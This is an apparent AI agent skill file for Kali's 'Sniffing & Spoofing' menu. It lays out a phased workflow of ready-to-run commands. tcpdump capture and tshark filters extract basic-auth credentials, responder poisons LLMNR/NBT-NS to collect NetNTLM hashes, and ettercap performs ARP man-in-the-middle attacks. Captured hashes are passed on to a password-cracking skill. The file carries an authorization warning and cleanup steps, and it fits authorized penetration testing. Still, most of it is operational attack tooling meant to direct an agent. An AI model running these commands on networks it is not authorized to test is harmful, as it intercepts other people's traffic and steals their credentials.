---
name: kali-sniffing-spoofing
description: "Kali menu 09 — Sniffing & Spoofing. Compound workflow for authorized traffic capture and analysis that chains tcpdump (capture), tshark/wireshark (dissect), responder (LLMNR/NBT-NS poisoning capture) and ettercap (ARP MITM) on a network you control. Use when the user wants to capture, sniff, analyze, or intercept network traffic on an authorized network/lab."
---

# Sniffing & Spoofing (Kali 09)

Goal: observe and, where authorized, intercept traffic on a network you control — to capture
credentials/hashes, analyze a protocol, or validate exposure.

## Authorization gate
Packet capture and MITM affect everyone on the segment. Run ONLY on a network you own or are
contracted to test, and ideally announce/scope it. Active spoofing (ARP, LLMNR) can disrupt
connectivity — prefer passive capture first and keep MITM windows short.

## Phase 1 — Passive capture (tcpdump)
```
sudo tcpdump -D                                    # list interfaces
sudo tcpdump -i eth0 -w cap.pcap                   # capture everything to file
sudo tcpdump -i eth0 'tcp port 80 or port 443' -w web.pcap
sudo tcpdump -i eth0 -n 'port 53'                  # live DNS, no name resolution
```

## Phase 2 — Analyze the capture (tshark / wireshark)
```
tshark -r cap.pcap -q -z io,phs                    # protocol hierarchy (what's in the file)
tshark -r cap.pcap -Y http.request -T fields -e http.host -e http.request.uri
tshark -r cap.pcap -Y "http.authorization" -T fields -e http.authorization  # basic-auth creds
tshark -r cap.pcap -z follow,tcp,ascii,0           # follow a stream
```
Open interactively in the GUI with `wireshark cap.pcap` (needs a desktop session).

## Phase 3 — Credential capture via poisoning (responder)
```
sudo responder -I eth0 -wv                         # answer LLMNR/NBT-NS/MDNS, capture NetNTLM
```
Captured hashes land in `/usr/share/responder/logs/`. Send them to **kali-password-attacks**
(`hashcat -m 5600` for NetNTLMv2).

## Phase 4 — ARP MITM (ettercap)
```
sudo ettercap -T -q -i eth0 -M arp:remote /<target-ip>// /<gateway-ip>//
```
`-T` text UI, `-M arp:remote` poisons both target and gateway so you see both directions.
Enable IP forwarding so you don't black-hole the target:
`sudo sysctl -w net.ipv4.ip_forward=1`.

## Cleanup
```
sudo sysctl -w net.ipv4.ip_forward=0
```
Ettercap re-ARPs on exit to restore tables; confirm the target has connectivity afterward.

## Output and handoff
Record: interface/segment, capture duration, protocols seen, any cleartext creds or hashes,
and the pcap filename as evidence. Hand NetNTLM hashes to **kali-password-attacks**.

## Gotchas
- All capture/MITM needs root.
- On a switched network you only see your own traffic without poisoning or a SPAN/mirror port.
- responder and ettercap are loud and disruptive — never run on production without sign-off.
- Capturing others' credentials is only lawful with authorization even on "your" corporate LAN.
